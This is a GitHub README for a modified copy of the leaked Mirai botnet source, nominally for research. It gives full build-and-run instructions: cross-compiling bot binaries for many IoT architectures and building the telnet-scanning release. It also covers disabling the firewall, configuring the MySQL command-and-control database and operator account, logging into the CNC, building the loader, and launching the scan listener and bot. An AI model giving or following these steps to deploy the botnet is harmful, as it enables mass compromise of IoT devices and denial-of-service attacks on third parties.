# Mirai BotNet to Tashiro(未来砲)
<!--

  ,～（（((((((～～､
  (  ＿（（ (((＿　)
  |/　~^^＼)／^^~ヽ|
  |　　＿　《　＿   |
 (|-(_//_)-(_//_)-|）
  |　　 　厶､　　   |     ／￣￣￣￣￣￣￣￣￣￣￣
  ＼   ||||||||　／　　＜  Mirai BotNet to Tashiro.
    ＼_________／       ＼＿＿＿＿＿＿＿＿＿＿＿

-->
Leaked Linux.Mirai Source Code for Research/IoT Development Purposes

Uploaded for research purposes and so we can develop IoT and such.

Modified from https://github.com/jgamblin/Mirai-Source-Code

I was referring to this for a moment.<br />
https://gist.github.com/ppoffice/86beb0f90de5aeec75aabd517ebc5e43

## Requirements
* To be able to use vi.
* Do not run in WSL.(I tried, but I couldn't use mysql or compile it.)
* It is recommended that Linux be used as the operating system.

## Credits
[Anna-senpai](https://hackforums.net/showthread.php?tid=5420472)

## Disclaimer
This repository is for academic purposes, the use of this software is your
responsibility.

## Warning
The [zip file](https://www.virustotal.com/en/file/f10667215040e87dae62dd48a5405b3b1b0fe7dbbfbf790d5300f3cd54893333/analysis/1477822491/) for this repo is being identified by some AV programs as malware.  Please take caution.

## Install

※If you are not logged in as root, be sure to add sudo and follow the installation instructions below.<br />
※If you are unable to install the software, please refer to the following URL for installation.

https://programmer.group/mirai-botnet-environment-setup-steps.html

```
# sudo apt-get install git gcc golang electric-fence mysql-server mysql-client
```
If you are using debian, you cannot install mysql as it is, so please install it in the following way.
```
# wget https://dev.mysql.com/get/mysql-apt-config_0.8.22-1_all.deb
# sudo dpkg -i mysql-apt-config_0.8.22-1_all.deb
# sudo apt update && sudo apt install mysql-server mysql-client
```
After installing the dependency tools, follow the steps below.
```
# git clone https://github.com/ware255/Mirai-Source-Code-plus.git
# cd Mirai-Source-Code-plus/scripts
```
Cross Compile
```
# chmod +x cross-compile.sh
# sudo ./cross-compile.sh
```
Enter "n" here.
```
Install mysql-server and mysql-client (y/n)? n
```
Edit .bashrc
```
# vi ~/.bashrc
```
Add the following string to the last line
```
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin

export GOPATH=$HOME/go
```
After adding and saving, enter the following command
```
# mkdir ~/go
# source ~/.bashrc
```
In mirai folder, run build.sh script
```
# cd ../mirai
# chmod +x build.sh
# ./build.sh release telnet
```
Get golang requiremnts
```
# go get github.com/go-sql-driver/mysql
# go get github.com/mattn/go-shellwords
```
If you have iptbales/ip6tables or any firewall install disable it.
```
# sudo service iptables stop
```
Database setup<br />
※It will ask you to set a password, make sure you remember this.
```
# sudo /usr/bin/mysql_secure_installation
```
Go to `cd cnc/` and replace the root password you just entered with the MySQL_Password.
```
const DatabaseAddr string   = "127.0.0.1:3306"
const DatabaseUser string   = "root"
const DatabasePass string   = "MySQL_Password"
const DatabaseTable string  = "mirai"
```
Add users to mysql.
```
# cd ../scripts
# sudo mysql -uroot -pMySQL_Password
> INSERT INTO users VALUES (NULL, 'tashiro', 'mystrongestpassword', 0, 0, 0, 0, -1, 1, 30, '');
> exit
# sudo service mysql restart
```
Once you restart the mysql server, go to your debug folder ./mirai/release, you will seen a compiled file named cnc execute it.
```
# cd ../mirai/release
# sudo ./cnc
```
Build loader
```
# cd ../loader
# chmod +x build.sh
# ./build.sh
```
This completes the installation. :)

## How to use
※If you are not logged in as root, be sure to add sudo and follow these steps.

https://programmer.group/mirai-botnet-environment-setup-steps.html

```
# ./release/cnc
```
Open a new winsow.
```
# telnet cnc.change.com 23
```
username & password
```
username: mirai-user
password: mirai-user
```
Open a new winsow.
```
# cd mirai/debug
# ./scanListen
```
Open a new winsow.
```
# sudo ./mirai.dbg
```
